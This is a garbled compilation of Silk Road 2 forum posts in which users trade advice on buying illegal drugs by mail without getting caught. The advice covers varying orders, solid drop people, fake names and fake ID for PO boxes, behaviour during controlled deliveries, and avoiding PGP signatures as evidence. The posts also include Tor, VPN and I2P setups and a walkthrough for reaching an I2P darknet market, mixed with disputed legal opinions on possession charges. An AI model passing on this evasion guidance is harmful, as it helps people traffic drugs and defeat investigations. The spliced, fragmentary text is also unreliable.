Quality4All.Keith Bristow, the NCAâs Director General had some chilling if not slightly Orwellian words âThese arrests send a clear message to criminals, the hidden internet isnât hidden and your anonymous activity isnât anonymous. We know where you are, what you are doing and we will catch you. Considering every arrest Iâve heard of so far involved a major security lapse of the vendors fault or in PlutoPetes case thinking he has nothing to fear Iâd consider his words more of a deterrent than an immediate threat, that said this could be very dangerous for PlutoPetes clients if the police get the data they presumably went after in the first place.Pete if your reading this Iâd be very interested in as few more follow up questions regarding your operating system setup etc. just to get a better picture of what data may potentially be compromised for other users."

They knew they were compromised thru Ross. SSBD might evt successfully avoid legal consequences for participating in SR2. But Libby and Inigo chose to stay using the same nyms.   Inigo even made a drama when people mentionned he was a liability, given his identity could not be verified, cos he deleted his PGP. He insisted until Libby vouched for him and he was granted to mod the book thread.  Libby? I remember him stating that after meeting his attorney to discuss evt. legal repercussions for him, having been a mod and admin on SR1 and all: I cannot be prosecuted or held accountable for what I did on Sr1 or do in here. I was thinking this guy must be some OPSEC genious. Maybe he really thought he wasn't breaking the law, which would mean he had the worst legal counceling possible. But that, we'll find out soon.    If Le recovered the doxxes on Ross computer by technical means, I believe it would be difficult for them to prove the tie between the names and the nyms. Unless they found the files next to the journal in a file named ""SR staff"" tying name, nym, picture and a function.   So my guess is Ross sang. And without his testimonial there isn't much of a case  against the mods (I'll assume they did not make any major OPSEC errors deanomynising them).  It is somewhat ironic to acknowledge that the only thing I believe that could have saved the crew, is what caused Ross demise. And that the remedy chosen would inevitably doom their fate.   Walking the legal way will inevitably lead Ross to sing sooner or later. Each accusation can yield him up to 10 years. 6 times intented murder? Conspiracy? Cybercrimes? If found guilty of be it one accusation, your life is done.  And I believe they've had plenty of time to do what they got to do. Ross wouldn't have hesitated on that one..   Other remarks:  how long have they been watched before the cops went and knocked on their doors?

Keep orders from same vendor to same address infrequent - all international mail is scanned / photographed so if u all of a sudden start receiving a package each week from same address looks suss on AusPosts records - they scan for that kinda shit nowadays. even if someone u never knew existed has a package seized and the vendor happens to have used the same return address for their packages as yours - easy to find cos all sender / receiver details are in the database, they'll come sniffin round.  Make sure ur drop person is fucking solid and knows that they can't do shit so long as drop says NOTHING.

Two detectives in plain clothes came into the post office, asking for all the records they had about that PO box as well as all the surviellance footage they had, which was about a months worth of footage. They questioned the staff member who setup the box about everything they remembered, what the person looked like who opened the box, etc.  They got the staff to put a slip in the box and told them if anyone came in to collect the package to go in the backroom and call the police. They didn't leave a dummy package or anything like that.  Luckily the person involved had an insider with Auspost, found out all this information less than 24 hours after the tracking disappeared after hitting Australian customs. The police worked VERY fast once they found the package, they were at the post office the next day.  Motto of the story BE CAREFUL WITH PO BOXES, they aren't 100% foolproof, if you lose a large amount they will investigate.  Remember that the PO stores camera footage, and your fingerprints can easily get on the forms when you fill them out, if you are using fake ID and they link fingerprints, camera footage and staff descriptions to prove you fraudelantly opened the box this could easily be enough to convince a jury you are guilty.",""

Quite numerous are the infractions of the US executive branch and its lap dogs. However, it isn't just big brother who wishes the details of your transactions. Little brother (corporate America) is in on the act. Whether it is companies trying to spam you with offers based off your browsing habits or your ISP trying to what you are browsing. Both brothers, big and little, forget a person's transactions are their business until they wish to disclose the act of the transactions (removing anonymity) or the contents there in (removing privacy).  Fortunately, there are open source methods out there to help solve the problem of maintaining the anonymity of the transactions, I2P and Tor . Note, neither of these network solutions, solve the problem of maintaining the privacy of the transaction. Both networks help to anonymize connections through a mix network. A mix network encrypts messages which it sends through a random series of proxies before it reaches its final destination. Each proxy peels off a layer of encryption until all the encryption is removed. This solves the problem anonymity as no node with the exception of the entry and the exit node knows the source and the destination. Another Problem  The problem with I2P and Tor is one can not access the resources of one network from the other without a specific outproxy. For example, if one has occured their web browser to accecss the I2P network, one can not access resources ending the a .onion URL (Tor resources). If one uses Firefox, one can use a proxy switching plugin such as SwitchProxy or Torbutton. However this solution only works for one browser and requires the user to actively switch to the appropriate proxies. A better solution is to use Privoxy's pattern matching capabilities to send the requests to the appropriate network without user intervention. Installing I2P, Privoxy and Tor  To install I2P, follow the instructions located here. Once I2P is installed, you need to start the router. The below example shows how to start the router on a Nix based system. The below example uses /home/marlowe/src/i2p as the directory in which I2P was installed. Make sure to change the commands appropriately.  % cd /home/marlowe/src/i2p % ./i2prouter start  You can confirm a successful start by connecting to the I2P router by clicking here. This page will cover the basics of I2P and how to configure your system if you simply want to use I2P to anonymize your traffic.  To install Privoxy, follow the instructions located here. Once Privoxy is installed, you need to start it. The below example shows how to start Privoxy on a RedHat based system.  # /sbin/service privoxy start  To install Tor, follow the instructions located here. The instructions after step one cover how to configure Tor to provide your answer browsing. For our example, you will only need to perform the actions in step one. Configuring Privoxy  There are multiple ways to configure Privoxy to allow access to resources on both networks. The first example uses Tor as the main network and uses I2P to access I2P specific resources (.i2p domains). Add the following lines to /etc/privoxy/config to enable anonymous browsing.  forward .i2p localhost:4444 forward-socks4a / localhost:9050 .  The first line tells Privoxy to forward any URL ending in .i2p through port 4444 on the localhost. This is the HTTP proxy for the I2P network. The second line tells Privoxy to forward all remaining requests through port 9050 on the localhost. This is the proxy port for the Tor network.  The second example uses I2P as the primary network and the Tor network to access Tor specific resources (.onion domains). Add the following lines to /etc/privoxy/config to enable anonymous browsing.  forward-socks4a .onion localhost:9050 . forward / localhost:4444  The first line tells Privoxy to forward any URL ending in .onion through port 9050 on the localhost. This is the proxy port for the Tor network. The second line tells Privoxy to forward the remaining requests through port 4444 on the localhost. This is the proxy port for the I2P network.  For both examples, the following lines need to be commented (""#"").  # logfile logfile # jarfile jarfile # debug 1 # show each GET/POST/CONNECT request  This prevents Privoxy from recording every request which passes through it.  Now set the HTTP proxy for your web browser to localhost:8118 (or whatever port you have Privoxy listening on) and the SOCKS proxy to localhost:9050 and set the version to 5. Finally restart Privoxy to have it reread the config file. The below line shows how to restart Privoxy on RedHat systems.  # /sbin/service privoxy restart Checking Your Configuration  To confirm your configuration is correct, open your web browser. First attempt to connect to www.i2p2.i2p . If this attempt is successful, the next check is to see if Privoxy sends appropriate requests through the Tor network. Connect to the hidden wiki. If you are successful, you are able to access both the I2P and Tor networks seamlessly.'",""

This doesn't really add any security over using Tor or i2p, and it doesn't tunnel over the other.  It just gives you a way to switch between the networks based on the URL you typed in (.i2p or .onion). ","I would like to know some opinion on the method outlined here, it appears you can run i2p inside tor, which surely would give a higher level security?"

Looks like we've got a headstart on everyone else!!!!!!!!  <<<<<<CLEARNET WARNING>>>>>>>.  http://www.theguardian.com/world/2014/jun/05/edward-snowden-privacy-reset-the-net    Edward Snowden joined Google, Reddit, Mozilla and a host of other tech firms and privacy groups Thursday to call for a strengthening of privacy rights online.  The Reset the Net campaign was launched June 5, a year after Snowdenâs revelations about the scale of the US governmentâs surveillance programs were first published in the Guardian and the Washington Post.  âOne year ago, we learned that the internet is under surveillance, and our activities are being monitored to create permanent records of our private lives â no matter how innocent or ordinary those lives might be,â Snowden said in a statement released by his attorney.  âToday, we can begin the work of effectively shutting down the collection of our online communications, even if the US Congress fails to do the same.""  Snowden said adopting encryption was âthe first effective step that everyone can take to end mass surveillance â¦ donât ask for your privacy. Take it back.â  ""It's been a year since Edward Snowden blew the whistle on the US government's abusive spying programs. In that time Congress and the Obama Administration have failed to protect our rights,"" said Tiffiniy Cheng, spokesperson for Fight for the Future, which co-ordinated the campaign.  ""Now, they've got a rebellion on their hands as tech companies and internet users work together to directly intervene in mass surveillance and block the NSA and its kind from the web.""  Speaking via satellite at the Personal Democracy Forum (PDF) conference in New York on Thursday, Snowden said mass global surveillance âisnât just an American problem, this is a global problem.â  He said US governmentâs creation of âbackdoorsâ into tech companies created openings for other countries to use and made us all less safe.  He was interviewed by John Perry Barlow, co-founder of Electronic Frontier Foundation. âIâm afraid weâve descended to this point,â said Barlow. âBut why do animals lick their genitals? Because they can. Why do governments do this? Because they canât lick their own.â  âTheyâre licking ours, and taking pictures,â Snowden replied.  Barlow also announced the launch of the Courage Foundation, a fund dedicated to supporting Snowdenâs legal battles.  The announcement was one of a series timed to coincide with Reset the Net.  Google announced its support for the campaign earlier this week and also published the source code for an âend-to-endâ encryption service for its Chrome browser. The company has asked developers to help it work on the project, which it hopes will offer a simple way for people to encrypt their communications and other data online.  On Thursday Mozilla, maker of the Firefox browser, also threw its support behind the campaign. Dave Steer, director of advocacy at the Mozilla Foundation, said in a blogpost that despite all the publicity surrounding the Snowden revelations âthe public policy landscape itself has changed very little and the threats to privacy and security are just as strong.â  The company announced it was setting up a research project, Cyber Security Delphi, with industry, academic and policy experts to better assess ways of improving security and privacy online.  Tumblr, the blogging site owned by Yahoo, announced it would be adding secure sockets layer (SSL) encryption by default for the readers of its 189m blogs.  The Guardian chose Reset the Net day to launch SecureDrop, a platform that allows people to anonymously submit documents and data.   ",""

When all the legal bullshit is said and done youd still come out on top. Just save your profit money.

Possession charges do NOT require any advance knowledge of the contents of the package or advance knowledge that the package will be delivered.  Take a scenario where a friend of yours (or even someone you don't know) orders drugs to your house without your knowledge.  You have no idea that he did it, you have no idea that it will be delivered to your house and you have no idea what is in the package.  Regardless of whether you sign for the package or not, once you take possession of the package and have knowledge of what it contains, you can technically be charged with drug possession.  Prior knowledge of the delivery, of the contents, of the order, DON'T MATTER for a possession charge.  There are two elements to a possession charge:  (1) Were you in possession of drugs.  (2) Did you know that you were in possession of drugs.  Think about how simple those 2 elements are and how easily they can be satisfied, and don't fool yourself into believing that the state needs to prove anything other than those 2 elements.

I think it is actually more suspicious to refuse to sign for something. But the best last ditch safety valve IMO is to simply sign for it no matter what and dont open it for a day or two.

A CD usually happens when LE already has evidence, usually non-DNM related, that the recipient is selling drugs. Could be a prior drug record, or evidence they gathered during an arrest of a customer, or neighbors complaining the person is selling drugs, etc. The person is already on LE's watch list.   Knocks and talks seem to happen when the recipient's past mail record shows a lot of similar looking packages originating from the same country as the seized pack. But maybe this person isn't known to LE in any way, so they just want to stop by, sniff around and possibly catch a lucky break if the idiot confesses or they see drugs lying around in plain sight.  Note that all mail is photographed in the US, so LE can clearly see if an identically packaged item made it through in the past.

"Silk Road 2 Forums","Baraka","57771","2014-10-28T07:06:10","How Do They Prove You Ordered It?","Discussion/Legal"," You're splitting hairs now. And this is a discussion on ILLEGAL DRUGS. Not selling alcohol to minors and traffic violations     I was addressing what was said about drugs only. I'm sorry I even brought up taxes which was done to explain this stuff for readers.  Going back to what you originally said:   Since it looked like you were saying otherwise in another part of your same post I called you out on it. Now I think I misunderstood what you were saying. This really confused me:   Then you brought up possession. When this was a discussion about ""How Do They Prove You Ordered It?""  I think you want to expand the discussion. That's ok. Maybe you should start a new thread about how ordering something can be turned into a possession or possession with intent charge? That's a whole other thing and something really worth talking about. I just don't know that this thread is the place to do it. This is a complicated subject and one that will confuse readers if you throw too many concepts and charges out there at one time.   Ok. I'll give you that one 100%. I take it all back.  For Florida. But the mens rea ""guilty mind"" requirement still applies everywhere else in America (and in almost every other free country in the world). But you really have to hand it to Florida. Illegal drug consumption has risen to near record levels since they went completely tyrannical. Its the kind of thing that would bring tears of joy to Putin if he were running things over there. Maybe he should run for governor sometime? He'd fit right in with those prosecutors turned judges who gave their stamp of approval for this shit      Everyone should take a look at the excellent article you linked. Very dark days for America. If you're in Florida the cops can arrest you on the spot for taking possession of a package containing illegal drugs. They don't need any evidence at all or need to prove that you knew what you were accepting anything illegal. You're guilty until proven innocent. Just like in Mexico. Or Turkey. Or Iran. Great countries to model your state after!      Now I think you're misunderstanding what I said like I think I did when responding to your last post. My point was that you need either a human or electronic contact for determining who is in possession of the target drugs. If human it needs to be an informant or LE themselves. If electronic its usually a GPS-enabled transmitter that can tell LE when the package is being opened. This latest link says all that very clearly. It all happened in Florida once again too. And chain of custody  is relevant in a CD. LE needs to be aware of where the incriminating package is at all times to build a case (they have custody of something  they know contains contraband and are transferring custody to someone outside of LE). If it suddenly disappears into thin air they can panic and lie to a judge about being able to secure a search warrant quickly (otherwise it'll take too long and the window of opportunity will close). What do you think will happen to a case like that with a competent lawyer?   Once again LE always has to have probable cause to initiate a search. Then again they can ask and most idiots will be only too pleased to waive their rights and cooperate with the search. But that's another story.  I understand your point about possession and I'm not disputing it. You're right and I never said otherwise. But LE has to know where the incriminating package is at all times and who opened it. Otherwise they can't prove beyond a reasonable doubt that the person charged was responsible for the package. The only state (and maybe only place in the free world) that this probably doesn't apply to is Florida. Thanks again for that article.   Sorry for ripping into you earlier. It wasn't deserved. I misunderstood what you said and I pointed out exactly what I found confusing. No need to rip into me too. I respect your knowledge. If anything we should combine our thoughts on more subjects like this. Anything to help others avoid a lifetime in the pen. Let's not forget why we're posting here in the first place. ","Your understanding of the western legal system is wrong and incomplete.  While mens rea (""having a guilty mind"") is in fact a required element for most crimes, including most drug crimes in most states, there is an ENTIRE category of crimes and torts (outside of tax law) that have no mens rea requirement at all.  They're called strict liability crimes, and include statutory rape, some weapons charges, selling alcohol to minors, traffic violations, and several others.  You're painting with a broad brush and generalizing, and you're giving false information.;There are two elements to a possession charge:  (1) Were you in possession of drugs.  (2) Did you know that you were in possession of drugs.;Take a scenario where a friend of yours (or even someone you don't know) orders drugs to your house without your knowledge.  You have no idea that he did it, you have no idea that it will be delivered to your house and you have no idea what is in the package.;This is not difficult at all.  The state of Florida's drug possession laws removed the mens rea requirement for drug possession back in 2002, and they've been upheld by the Florida State Supreme Court.  You asked for one case.  There are literally hundreds of thousands of cases where no mens rea was required and people were convicted of drug crimes without any ""guilty mind"" and with only the actus reus (""guilty action"") proven.http://news.wfsu.org/post/florida-supreme-court-upholds-controversial-drug-law;Once again, you're generalizing and wrong.  A CD is absolutely not needed to establish possession.  By the very legal definition of possession, the only thing required to establish possession is a person X having ACTUAL POSSESSION of the contraband.  The trail of how it got to person X is completely irrelevant to a possession charge.   You clearly have no idea what a possession charge requires if you believe a chain of custody is required.  Chain of custody is important to track evidence AFTER an arrest has already been made and the drugs are in LE hands to be tested and used in a trial.LE can very easily put a GPS tracking device in a package to track its whereabouts, and in that case, no CD is required and it breaks the mythical âchain of custodyâ that youâre fantasizing about being relevant.  See below case for an example:http://www.naplesnews.com/news/crime/postal-employee-accused-of-setting-up-illegal;This thread started with people asking about how LE could ""prove that you ordered something.""  The fact remains that LE does NOT have to prove that you ordered drugs to charge you with possession, or even with intent to distribute.  All they need to show is that you were in possession of drugs, and in most states, that you knew that they were drugs.  They donât have to prove how you paid and donât have to prove a âchain of custody.â  Thatâs complete bullshit, and if you think itâs true, then go ahead and show me a single stateâs drug laws that require any of those things as an element of a drug crime.;As someone who has extensive experience in the legal system, I can say that the amount of misinformation here is embarrassing.  Itâs fine if youâre not a lawyer and donât understand the laws, but at least be honest and quit pretending that youâre a legal expert when the advice youâre giving is so blatantly wrong."

If you have suspicious packages coming on a regular basis then you're pretty fucked. If it was a first time order you could feign ignorance but you're still goign to get charged with intent to receive contraband, conspiracy (vague and very high felony) or a similar charge. You can be charged with anything, it's up to a jury to convict you. You're innocent until proven guilty but good luck with that considering 95% of cases get settled in plea agreements. ",""
"Silk Road 2 Forums","FooManJew","57771","2014-09-26T06:52:47","How Do They Prove You Ordered It?","Discussion/Legal","The state does NOT have to prove that you ordered the drugs.  They have to prove that you knowingly possessed them.  Don't confuse the two, because there is absolutely zero burden on the state to prove HOW you came into possession of the drugs, and they don't even need to prove that you intended to possess the drugs.  They only need to prove that you knowingly possessed them.  This means that if you find a bag of coke on the street, pick it up, are aware that it's cocaine, and put it in your pocket, you're guilty of knowingly possessing it.  It also means that if someone puts a bag of coke in your jacket pocket without your knowledge, that if you find that bag, become aware of what it is, and you don't immediately throw it away or get rid of it, that you're guilty of possession.  The knowingly mens rea can also be proven by what's referred to as willful blindness.  Meaning if a person consciously avoids uncovering facts that may prove knowledge of a crime, they're just as guilty as a person that has actual knowledge.  So if a friend of yours comes to your door, hands you a duffel bag and says ""here, hide this in your basement,"" and you fail to open the bag full of coke and just put it in your basement, you can still be convicted of knowingly possessing that bag of drugs, even though you had no actual knowledge of what was in the bag.  You also need to realize that the mens rea of knowingly can be proven by inferences and circumstantial evidence, and the DA does NOT need direct evidence of knowledge.  So in your scenario where you sign for a package, open it up and see what's inside, and then get raided by LE, you could of course claim that you didn't order it and didn't know what was in it.  But let's say the DA looked at your web history on your computer and found that you searched google for bitcoin prices, or information on darknet markets, or that you bought a bong or rolling paper on ebay....all of that could be used as circumstantial evidence to prove your knowledge, even though none of it is directly tied to you knowing what was in the package.    Even if there were other innocent explanations for the searches, it wouldn't matter.  The DA would use it to show that you had an interest in drugs in general, and that could be enough for a jury to infer that you knew what was in the package.  Even something like your behavior on the day you were raided can be used to show knowledge.  If you were sweating, or stuttering, or otherwise acted nervously, they could use that to infer knowledge.  There are all kinds of different types of circumstantial evidence that the DA could use to infer that you were aware that there were drugs in the package, and none of them require proving that you actually ordered the drugs.

If there are multiple packages fitting the same profile, like a bunch of packages from netherlands with the same return address, then they will pursue the lead further. This could entail a CD, a stop and chat, surveillance, etc.   If they perform a CD and you sign for the package and open it, and they have no other evidence on you, that's not enough for an arrest. Which is why they would just drop the lead in that case.   If you sign for the CD and your historical mail was suspicious and perhaps they find scale and drugs in your house, you're toast.   If you sign for the CD and the only other evidence against you was suspicious historical mail, it could go either way.

"Silk Road 2 Forums","Baraka","57771","2014-10-07T00:55:32","How Do They Prove You Ordered It?","Discussion/Legal"," Yeah you got it. Any reasonable person would sign for a package. What counts to LE is what happens  during and after a CD is done. Whether you look nervous. Whether you were expecting anything or were surprised that you were receiving something. What your responses were to anything the mailman said. Then when you opened the package and what you did with the contents. And finally how you reacted when LE either came quietly or busted your door down later on.  I think something to keep in mind is that LE doesn't have unlimited resources to wait to complete a control delivery with a search warrant. That means the longer you wait the more of a pain in the ass it'll be for LE to finish what they started. There's some really good advice here about properly accepting a package. Wait a few days to open it. Leave it near the front door until you do. You can mark return to sender on it if you want but what really counts in the end is how you react to LE in person. That's all that really matters. The rest is ok if it makes you feel good. It won't help you if you're charged and ever make it to court.","Any normal citizen who recieves mail and one day they mail man says we need you to sign for this sir/mam, A normal non drug buying person would sign for it and just expect its some form of maybe the way a family member sent you a surprise, friend,GF etc.  Most ppl who are not doing wrong would have no issue signing for a package.

I think the prosecutions argument was  ""No one would send u free drugs lol"". but yeah he got in trouble, just don't ever sign for the package because LE will do what they want.

It also ruins the details of stealth you were using that can easily take hours of effort to replace. I guess that stealth reason is a good one for not being willing to ship to LE on purpose after all. I guess I would cancel or maybe make a new lower security less stealthy joke-return-address-package (from another government office in a town you travel to ship from)? Probably should just cancel and not ""poke the Bear"".   Would I take any order from that buyer ever again? If they promised it was not a joke/gov't address? IDK.",""

I'll quote the important parts here:   I hope this helps you form an opinion.  Please note my two edits concerning IP addresses.","Is privnote a secure way to send sensitive information to a contact?Who owns it?Is there a chance they would store all messages?Thanks for any information.PhantomUlbricht;So here's what happens when you create a note in Privnote:1. You write the note and click the POST button2. The server generates a random note id, let's call it the NoteID. This is the 16 chars ID you see in the note link3. The server hashes the note ID and gets a HashedNoteID = Hash(NoteID). We're currently using SHA-1 as the hashing algorithm, but the particular algorithm is not very important here4. The server encrypts the note contents (and also the email and reference, if there is any) using the NoteID, and stores the encrypted version in the database using the HashedNoteID as the database primary keyFor completeness, this is what happens when you view a note in Privnote:1. The server extracts the NoteID from the URL2. The server hashes the NoteID and gets the HashedNoteID. This is the same HashedNoteID used when generating the note, since the NoteID used to make the hash is the same in both cases3. The server retrieves the note from the database using HashedNoteID as the database primary key and decrypts its contents using NoteID as the encryption key4. The server shows the page with the decrypted note5. The server permanently deletes the note from the database, keeping only a record of the HashedNoteID, the time when it was read, and the IP address where it was read from, to show it when someone tries to see the note again;5. (...) keeping only a record of (...) the IP address where it was read from (...);2. How the notes and its contents are processedThe link is generated in the user's browser and at no time is sent as such to Privnote. The link is thus in the sender's (and later possibly in the recipient's) hands only. Therefore, there is no way to recover a note if a Privnote user losses the link.Since only the link binds the decryption key to the note's content and since Privnote does not have the link, at no time is any note held in any readable format state at Privnote. This assures that nobody (including Privnote's administrators) can read a note.When a note is retrieved, its data is completely removed from Privnote, which implies there is absolutely no way to recover it again.When a note is not retrieved after 30 days, Privnote removes it permanently, just as if it were read.Privnote sysadmin team will do as much as possible to protect the site against unauthorized access, modification or destruction of the data. But, even if someone or something could manage to gain access to the database, they would be unable to read the notes since their contents are encrypted and can't be decrypted without the links which Privnote never has a hold of.3. Processing of IP addressesPrivnote is not logging the IP addresses; they are processed to enable communication with Privnote's servers but they are not part of the log-files. IP addresses are deleted as soon as they are no longer needed for the purpose of communication.6. Disclosure of Data to Third PartyPrivnote does not share nor sell any information to others, nor use it in any way not mentioned in this Privacy Policy."

","Quote from: Vizzini on October 16, 2013, 09:25:15 ambuyer -> gpg -> privnote -> vendor  =  buyer -> gpg -> vendorUnderstand?That's retarded.   The lazy use it as a replacement for pgp, not in conjunction with it.Besides, there is no benefit to be had  whatsoever by using privatenote in that scenario.  LE can still take a SS, cut n paste, whatever...  the link still must be sentThanks for clarifying dude was trying to be cute."

Seems legit. I'll check it out. Where are you getting your coins? I feel like I should wait for all this ""slow deposit"", ""disappearing coins"" nonsense to stop before I buy some (aside from waiting for the value to stabilize and these exchange site attacks to be resolved). What do ya think?I buy instantly on coinbase and then tumble away.  I only buy coin I am going to spend immediately so it decreases the risk of fluctuation drastically."

"Silk Road 2 Forums","Nightcrawler","1960","2013-11-04T13:12:32","PGP advice please!","Discussion/Security"," As others have said, GPG4USB is probably the easiest software for newbies to use.  Please pay close attention to what I have said in my .sig block -- PGP may help you going forward, but it is NOT magical pixie dust that will somehow magically make you secure. It is a tool, and if it isn't used properly, you lose its' protection.   Please assimilate and understand these points:   * PGP stands for Pretty Good  Privacy -- PGP protects your privacy, it does NOT make you anonymous.   * If you are using PGP for email protection, please understand that PGP protects only the message itself -- it does not protect the meta-data -- the From:, To:, Subject:, and other header lines that reveal who you are communicating with. It is no accident that Edward Snowden's revelations about NSA surveillance have centered so much on meta-data.   * PGP can be used for authentication -- it vitally important that you do  NOT use this feature. I have long maintained that, as a general rule, you should SIGN NOTHING. Once you use PGP to sign a message, if the contents of that message are incriminating, then what you have done is to produce a digitally-signed confession to illegal activity. All someone needs to verify a PGP-signed message is your PGP public key. Once a signed message verifies,  you cannot later disavow it as a forgery.

It shouldn't ask you for a password to print out a list of the secret keys stored in your keychain. Now ask it to export your secret key: $ gpg --export-secret-keys. Even for this sensitive operation, in its default configuration, once again GPG doesn't ask for a password. While it is true that both the password and the secret key are required to make use of the exported key, the key itself is discoverable with physical access to one's computer. If LE has one's keyring, even without the password, it's enough to link one to one's messages if one does not take care. Also, if they have one's private key, if one doesn't have a strong password, it's likely it'll be brute forced; dictionary attacks are quite strong these days."

But until then, I would like to get some feedback from the community about the legal notions regarding both Fake names and Real names while having packages shipped out.  Most of the time, since the inception of Silk Road 1, I have always used a Fake Name, and my argument was that, if anybody was watching me pick up the package and I have not opened it, then I could say, ""I have no Idea what this it, this isn't even in my name"". and play dumb like that.  But recently, the last package that was shipped out was marked ""Undeliverable As Addressed"". And my package got sent back, I think they re-routed it to another state.  So, my point is, buying dope on the internet is all fine and dandy, but if you are not getting your packages, then what is the point, right?  So, if I start using my real name, would Law Enforcement still have to provide the same burden of proof, and prove that I have knowledge of what is inside the package. They have to prove, without a reasonable doubt, that I am aware that there is dope in the package?  So, my question is.......Is it just as safe, Legally Speaking, to use a Fake Name / Alias to receive packages on the Silk Road and other Darknet Marketplaces as it is to just use your real name?  The only reason why I am even considering using my real name when sending my address through PGP-encrypted messages is because, like I said, these last two shipments, have been marked as ""Undeliverable As"", and I do not want to lose any more money.  So, would the same legal prerequisite still apply whether or not I use my Real Name of a Fake Alias Name.  How I would normally do it, I would go on the SSA.gov website and look at the most common First Names in the USA, then I would do the same for the most Common Last Names, and I would have fun playing mix and match between different packages.  Of course I would never be so dumb as to use John Smith.  But I would love to hear some input on this issue, and it is an issue. ",""

"Silk Road 2 Forums","nickt22","31589","2014-03-12T17:50:03","how LE will search your house without a warrant","Discussion/Legal","Yeah these officers definitely over-stepped their boundaries here. They don't need a warrant/probable cause to knock on the door but the fabricated probable cause to search your trashcan is total bullshit and would never hold up in court if they wanted to charge you with anything. Of course seeing the pipe laying out would qualify as ""Open eye consent,"" but if I understand correctly the officers didn't see that until they had already invited themselves in to search the trash. This is probably why they had no intention of arresting any of you, they knew this was an illegal search and seizure and that they had no case. Seems they just wanted your source. Even with a warrant, hard evidence and a very specific scope is needed for any case to be made, so you probably would not have even gotten charged with the mushies if they found them. A perfect example is my personal experience from my first year of college. My apartment was raided with a no-knock warrant on suspicions of stolen firearms. Well guess what? I don't steal firearms...in fact I didn't have any at all then. All they found was a couple sheets of acid in my school binder. So yes I went to jail, but the charges never stuck. Luckily the search warrant had two major flaws..1) they came looking specifically for guns, and didn't find any.

Stay safe everyone. and if you don't already, know your rights!! don't be a victim","this happened many moons ago, I lived with 3 other people had a fourth friend over. roommate B and friend go and buy some weed just around the corner, there leaving and notice a cop they pass him he does nothing(so they think) they come back home and about 10 mins later theres a knock on the door someone else answered I was in the shower, roommate A comes and gets me, they come in and say someone just dine and dashes a local restaraunt and someone who worked in the restaraunt followed them back to our location. this gave them probable cause to come in and look in our trash cans. there was no stolen food but le saw a pipe that no one had grabbed and some seeds and stems laying around. this gave them cause to search the rest of the house until they found the ounce that roommate B had just bought. they smash our glass take roommates weed and tell him they wont arrest him if he helps them nab the guy he bought it from, he rolls, end of situation all these cops where huge cocky asshole and if I had been older and a little bit smarter I might have been able to do something about it either during or afterwords, but it wasnt my problem and roommate B handle it as they saw put im just glad they didnt find the couple of ounces of mushrooms I had"

Walking into a USPS facility and checking a PO box with drugs using a GPS scanner on top of getting the box using a fake ID isn't going to look good.  Most police will figure it is more than enough evidence for an arrest.  I just haven't figured out how using a fake ID helps except that they have to wait for you to show up to the post office since they don't know your name/address until you get there.  Once you get there they are going to arrest you....it is just a matter of when.  They may arrest you there or they may arrest you when you get home.  Tossing the drugs or the GPS scanner out of your car won't help either.  There has already been a case where a couple tried that with ecstasy pills in California I believe.

Then, what going through Tor -> VPN accomplishes is essentially locking down your exit node, and hiding the fact that you're using Tor from the rest of the internet. Also, in this situation, if your VPN is compromised you'll be identified as just another Tor user (assuming you purchased your VPN anonymously).  What going through VPN -> Tor would accomplish is hiding the fact that you're using Tor from your ISP. If you need to do this, Tor bridges are a better way to go about it, as far as I can tell.

Or, alternatively, Bridge -> Tor -> VPN.  Using a bridge (or additional proxy or other means of hiding your Tor activity from your ISP) is especially useful if you live in a sparsely populated area, or there otherwise aren't likely many other Tor users in your area, making you stand out more.  Also, LE could potentially correlate the timing of your connections to Tor (as logged by your ISP) with the timing of posts, purchases, or other things suspected to be done by you while using Tor. This alone would only be circumstantial evidence, but could be used in combination with other evidence to strengthen their case against you.

If you're using a VPN in combination with Tor, make sure you connect to Tor first and then run your VPN through that connection, and not the other way around. It depends on your use cases, but in some situations Tor + VPN can actually be less secure than Tor alone. For the purposes of the average buyer, this should be fine, though, as long as your endpoint security and general opsec are good. As always, don't run this on the same machine you use for general browsing, and don't contaminate your secure connections with any accounts, predictable browsing habits, or other info that could be linked back to you.  Also, while a secure VPN is good for many purposes (especially against corporate or other private adversaries with relatively limited resources) and handy to have as a last line of defense, you shouldn't depend on that alone when you're up against a sophisticated adversary like federal law enforcement. Even if the VPN operator makes claims like not keeping logs and refusing gov subpoenas, it's still a potential point of failure that can be corrupted or subverted.",""

The difference when you run i2p instead of tor is that you have to let it run for 5 minutes before you are connected to the network. No big deal, go do some pushups.   The big difference? this site has p2p escrow, that means youre not putting all your money into someone elses wallet. The administrator still has the power to release escrow to the winner, but he cant steal the escrow money without buyer or seller consent. This is called ""2 of 3"" signatures, meaning 2 of 3 parties have to consent to which direction the escrow gets released. The site is still in development but it has more features than SR1 or 2 has and is fully functional. Give it a look, download i2p  http://www.i2p2.de/download  Run it. Let it sit for 5 minutes or so, then type in the address bar:  themarketplace.i2p  it will say ""eepsite not found in addressbook"", below that it says:    click on the 'i2host.i2p jump service' link , it will redirect to a page with some buttons on it, click on the 2nd one with the green checkmark next to it, you wont see the warning anymore and the site will load when you enter it into the address bar. then just register an account (you will need to put in your pgp, you can generate one using http://gpg4usb.cpunk.de/download.html, -if you're using tails be sure to use persistence or save your key on a separate usb or you wont be able to decrypt messages).   Thats it, just take a look, then come back in a little while, there will be more vendors coming on as tor markets continue to shutdown and steal user funds.    "," Could not find the following destination:http://themarketplace.i2p/Click a link below to look for an address helper by using a ""jump"" service:i2host.i2p jump service ;Obviously the ongoing development of what appears to be by far the most secure market around, is leavingthe developers little time to actually promote their site.Having lost a little money in the Sheep heist (though nowhere near as much as some people), I'm most interested in the market that provides the best security for vendors and customers. And from what I can see, the safest option by far is The Marketplace.(Especially given the implications that those behind Tormarket may be associated with, or the same people who ran Sheep). All payments require 2-party authorization. And PGP encryption is mandatory!As far as I can tell, the main issue at the moment is gaining access to the site,(no point in having the safest market around if no one can get to it) so I've devisedthis walkthrough in order to help those new to i2p (as I was).Disclaimer I'm new to reddit so you may have to bear with me while I get the hang of the formatting conventions etc.And visiting TheMarketplace was my first experience with i2p and eepsites (the sites hosted on the i2p network)so forgive me if I misuse any technical terms - I'll be learning along with the rest of you.THE GUIDESTEP 1. Download and install the TAILS operating system (If you aren't already using it).It has the i2p package you need to reach TMP pre-installed, and is probably the safest and easiest option available.It can be burned to DVD or installed on a USB stick (instructions on the TAILS site).STEP 2. When you first log in to TAILS it'll automatically open the iceweasel browser andbegin connecting to the TOR network. You can close iceweasel as TOR isn't used for accessing sites on the i2p network.Then from the Applications menu on the top-left corner, go to Internet > and select i2p .This will start the application and bring up the i2p router console.At this point I would advise immediately disabling javascript via the NoScript extension .JS is a possible security risk and TheMarketplace has been designed to function fully without it.Now it'll take a little time (5-10 mins) 